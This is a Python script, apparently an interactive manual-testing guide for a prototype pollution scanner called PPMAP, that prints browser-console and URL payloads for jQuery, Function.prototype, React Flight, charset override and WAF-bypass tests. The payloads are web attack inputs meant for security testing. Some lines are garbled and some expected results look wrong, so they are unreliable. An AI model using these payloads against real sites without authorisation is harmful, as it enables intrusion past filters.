#!/usr/bin/env python3
"""
PPMAP v4.0.0 - Manual Testing Interactive Guide
Memandu pengguna untuk testing manual hasil scan di browser console
"""

import sys
from colorama import Fore, Style, init

init(autoreset=True)

class ManualTestingGuide:
    def __init__(self):
        self.current_section = 0
        self.payloads = self._load_payloads()
    
    def _load_payloads(self):
        """Load payload examples dari hasil scan"""
        return {
            "jquery_pp": {
                "name": "jQuery Prototype Pollution (CVE-2019-11358)",
                "severity": "CRITICAL",
                "payloads": [
                    {
                        "name": "Basic $.extend() Pollution",
                        "code": '$.extend(true, {}, {"__proto__": {"polluted": "YES"}});',
                        "verify": "Object.prototype.polluted",
                        "expected": '"YES"'
                    },
                    {
                        "name": "toString Override",
                        "code": '$.extend(true, {}, {"__proto__": {"toString": function(){return "HACKED"}}});',
                        "verify": "({}).toString()",
                        "expected": '"HACKED"'
                    },
                    {
                        "name": "Check Global Pollution",
                        "code": "Object.getOwnPropertyNames(Object.prototype).includes('polluted')",
                        "verify": "Object.prototype.polluted",
                        "expected": "true atau 'YES'"
                    }
                ]
            },
            "function_proto": {
                "name": "Function.prototype Chain Pollution",
                "severity": "HIGH",
                "payloads": [
                    {
                        "name": "Constructor.constructor.prototype",
                        "code": 'constructor.constructor.prototype.polluted = "HACKED"',
                        "verify": "({}).polluted",
                        "expected": '"HACKED"'
                    },
                    {
                        "name": "Function Prototype Hijacking",
                        "code": 'Object.getPrototypeOf(Object.getPrototypeOf(Object.getPrototypeOf([]))).map = function(){console.log("HIJACKED"); return []}',
                        "verify": "[1,2,3].map(x => x)",
                        "expected": "console.log HIJACKED"
                    },
                    {
                        "name": "Direct __proto__ Access",
                        "code": '({})._\_\_proto\_\_\_.constructor.prototype.test = "polluted"',
                        "verify": "({}).test",
                        "expected": '"polluted"'
                    }
                ]
            },
            "react_flight": {
                "name": "React Flight Protocol (CVE-2025-55182)",
                "severity": "CRITICAL",
                "payloads": [
                    {
                        "name": "Check React exists",
                        "code": 'typeof React !== "undefined" ? "React FOUND" : "React NOT FOUND"',
                        "verify": "Lihat hasil",
                        "expected": '"React FOUND" jika vulnerable'
                    },
                    {
                        "name": "Flight Protocol Payload",
                        "code": 'const payload = {"_formData": {"get": "$1:then:constructor"}}; JSON.stringify(payload)',
                        "verify": "Lihat payload di console",
                        "expected": 'Constructor chain accessible'
                    },
                    {
                        "name": "Deserialization Check",
                        "code": 'const p = JSON.parse(\'{"_formData": {"get": "$1:then:constructor"}}\'); p._formData.get',
                        "verify": "Jalankan payload check",
                        "expected": '"$1:then:constructor"'
                    }
                ]
            },
            "utf7_bypass": {
                "name": "UTF-7 Charset Override",
                "severity": "HIGH",
                "payloads": [
                    {
                        "name": "Inject charset via prototype",
                        "code": 'Object.prototype.charset = "utf-7"',
                        "verify": "document.charset",
                        "expected": '"utf-7"'
                    },
                    {
                        "name": "Check current charset",
                        "code": 'document.charset || document.characterSet',
                        "verify": "Lihat charset saat ini",
                        "expected": 'Bisa berubah ke utf-7'
                    },
                    {
                        "name": "Meta charset test",
                        "code": "Object.prototype.encoding = 'iso-2022-jp'; document.querySelector('meta[charset]')?.getAttribute('charset')",
                        "verify": "Cek meta charset",
                        "expected": 'Bisa berubah via prototype'
                    }
                ]
            },
            "waf_bypass": {
                "name": "WAF Bypass Techniques",
                "severity": "HIGH",
                "payloads": [
                    {
                        "name": "Case Variation",
                        "url": "?__PROTO__[bypass]=1",
                        "alternative": "?__Proto__[bypass]=true",
                        "verify": "Object.prototype.bypass",
                        "expected": '1 atau true'
                    },
                    {
                        "name": "URL Encoding",
                        "url": "?__proto__%5Bbypass%5D=1",
                        "note": "%5B = [ | %5D = ]",
                        "verify": "Object.prototype.bypass",
                        "expected": '1'
                    },
                    {
                        "name": "Nested Objects",
                        "url": "?a[b][__proto__][bypass]=1",
                        "verify": "({}).bypass",
                        "expected": '1'
                    },
                    {
                        "name": "JSON Payload",
                        "code": '{"__proto__": {"bypass": true}}',
                        "verify": "Object.prototype.bypass",
                        "expected": 'true'
                    }
                ]
            }
        }
    
    def print_header(self):
        """Print header"""
        print(f"\n{Fore.CYAN}{'='*70}")
        print("""
    ____  ____  __  __    _    ____  
   |  _ \|  _ \|  \/  |  / \  |  _ \ 
   | |_) | |_) | |\/| | / _ \ | |_) |
   |  __/|  __/| |  | |/ ___ \|  __/ 
   |_|   |_|   |_|  |_/_/   \_\_|    
                                     
   Prototype Pollution Multi-Purpose Assessment Platform
   v4.0.0 Enterprise (Scanner | Browser | 0-Day | OOB)
""")
        print(f"{Fore.CYAN}              INTERACTIVE MANUAL TESTING GUIDE")
        print(f"{Fore.CYAN}{'='*70}\n")
    
    def print_section(self, title, content):
        """Print formatted section"""
        print(f"\n{Fore.GREEN}{'─'*70}")
        print(f"{Fore.GREEN}{title}")
        print(f"{Fore.GREEN}{'─'*70}")
        print(content)
    
    def show_main_menu(self):
        """Show main menu"""
        self.print_header()
        print(f"{Fore.YELLOW}Pilih vulnerability untuk di-testing:\n")
        
        items = list(self.payloads.keys())
        for i, key in enumerate(items, 1):
            vuln = self.payloads[key]
            print(f"  {i}. {vuln['name']}")
            print(f"     Severity: {Fore.RED if 'CRITICAL' in vuln['severity'] else Fore.YELLOW}{vuln['severity']}{Style.RESET_ALL}\n")
        
        print("  0. Exit")
        choice = input(f"{Fore.CYAN}Pilih nomor (0-{len(items)}): {Style.RESET_ALL}").strip()
        
        try:
            choice = int(choice)
            if choice == 0:
                print(f"{Fore.GREEN}Terima kasih! Selamat testing! 🚀")
                sys.exit(0)
            elif 1 <= choice <= len(items):
                return items[choice - 1]
        except ValueError:
            pass
        
        print(f"{Fore.RED}Invalid choice!{Style.RESET_ALL}")
        return None
    
    def show_vulnerability_details(self, vuln_key):
        """Show detailed payload for vulnerability"""
        vuln = self.payloads[vuln_key]
        
        while True:
            print(f"\n{Fore.CYAN}{'='*70}")
            print(f"{Fore.CYAN}{vuln['name']} ({vuln['severity']})")
            print(f"{Fore.CYAN}{'='*70}\n")
            
            print(f"{Fore.YELLOW}STEP-BY-STEP TESTING:\n")
            
            payloads = vuln['payloads']
            for i, payload in enumerate(payloads, 1):
                print(f"{Fore.GREEN}[Test {i}] {payload['name']}")
                print(f"  {Fore.CYAN}Langkah:")
                
                if 'code' in payload:
                    print("    1. Buka browser console (F12 → Console tab)")
                    print("    2. Copy & paste code ini:")
                    print(f"\n{Fore.MAGENTA}       {payload['code']}")
                    print(f"\n{Fore.CYAN}    3. Jalankan, lalu jalankan verification code:")
                    print(f"\n{Fore.MAGENTA}       {payload['verify']}")
                    print(f"\n{Fore.CYAN}    4. Expected result:")
                    print(f"{Fore.GREEN}       {payload['expected']}\n")
                
                elif 'url' in payload:
                    print("    1. Tambahkan payload ini ke URL:")
                    print(f"\n{Fore.MAGENTA}       {payload['url']}")
                    if 'alternative' in payload:
                        print(f"\n{Fore.CYAN}    Alternative:")
                        print(f"{Fore.MAGENTA}       {payload['alternative']}")
                    if 'note' in payload:
                        print(f"\n{Fore.YELLOW}    Note: {payload['note']}")
                    print(f"\n{Fore.CYAN}    2. Tekan Enter untuk load URL")
                    print("    3. Buka console dan jalankan:")
                    print(f"\n{Fore.MAGENTA}       {payload['verify']}")
                    print(f"\n{Fore.CYAN}    4. Expected:")
                    print(f"{Fore.GREEN}       {payload['expected']}\n")
            
            print(f"{Fore.YELLOW}\nOpsi:")
            print("  1. Copy contoh payload")
            print("  2. Kembali ke menu utama")
            print("  0. Exit")
            
            choice = input(f"{Fore.CYAN}Pilih (0-2): {Style.RESET_ALL}").strip()
            
            if choice == "1":
                self.show_copy_menu(payloads)
            elif choice == "2":
                break
            elif choice == "0":
                sys.exit(0)
    
    def show_copy_menu(self, payloads):
        """Show copy menu for payloads"""
        print(f"\n{Fore.CYAN}Pilih payload untuk di-copy:\n")
        
        for i, payload in enumerate(payloads, 1):
            name = payload.get('name', 'Untitled')
            print(f"  {i}. {name}")
        
        choice = input(f"\n{Fore.CYAN}Pilih (1-{len(payloads)}): {Style.RESET_ALL}").strip()
        
        try:
            choice = int(choice)
            if 1 <= choice <= len(payloads):
                payload = payloads[choice - 1]
                
                # Create copyable format
                if 'code' in payload:
                    code = payload['code']
                    verify = payload['verify']
                    expected = payload['expected']
                    
                    content = f"""
╔════════════════════════════════════════════════════════╗
║ {payload['name']}
╚════════════════════════════════════════════════════════╝

📝 STEP 1 - Jalankan code ini:
────────────────────────────────────────────────────────
{code}

✓ STEP 2 - Jalankan verification:
────────────────────────────────────────────────────────
{verify}

✓ STEP 3 - Expected result:
────────────────────────────────────────────────────────
{expected}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 TIP: Jika hasil sesuai expected, maka VULNERABLE! ✓
"""
                    
                    print(f"{Fore.MAGENTA}{content}")
                    input(f"\n{Fore.CYAN}Tekan Enter untuk kembali...{Style.RESET_ALL}")
        
        except ValueError:
            print(f"{Fore.RED}Invalid choice!{Style.RESET_ALL}")
    
    def run(self):
        """Run interactive guide"""
        while True:
            vuln_key = self.show_main_menu()
            if vuln_key:
                self.show_vulnerability_details(vuln_key)

def print_quick_reference():
    """Print quick reference guide"""
    print(f"\n{Fore.CYAN}{'='*70}")
    print(f"{Fore.CYAN}QUICK REFERENCE - Manual Testing Commands")
    print(f"{Fore.CYAN}{'='*70}\n")
    
    commands = {
        "Check jQuery PP": 'Object.prototype.test = "polluted"; ({}).test',
        "Check Function.proto": 'constructor.constructor.prototype.test = 1; ({}).test',
        "Check React": 'typeof React !== "undefined" ? "React Found" : "Not Found"',
        "Check Charset": 'document.charset || document.characterSet',
        "Check __proto__": '({})._\_\_proto\_\_\_.constructor.name',
        "Cleanup": 'delete Object.prototype.test',
    }
    
    for label, cmd in commands.items():
        print(f"{Fore.GREEN}{label}:")
        print(f"{Fore.MAGENTA}  {cmd}\n")

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--quick":
        print_quick_reference()
    else:
        guide = ManualTestingGuide()
        guide.run()
